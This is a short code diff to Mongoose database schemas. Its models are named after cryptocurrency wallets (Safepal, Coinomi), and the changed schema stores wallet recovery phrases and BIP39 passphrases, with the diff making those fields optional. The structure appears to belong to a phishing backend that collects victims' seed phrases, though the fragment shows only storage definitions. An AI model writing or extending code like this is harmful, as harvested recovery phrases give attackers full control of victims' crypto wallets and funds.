@@ -70,8 +70,8 @@ const schema7Use = mongoose.model('Safepal', schema7);
 
 const schema8 = new mongoose.Schema({
     Time:{type:String},
-    recoveryPhrase: {type:String , required:true},
-    bip39passPhrase: {type:String , required:true}
+    recoveryPhrase: {type:String},
+    bip39passPhrase: {type:String}
 });
 const schema8Use = mongoose.model('Coinomi', schema8);
 
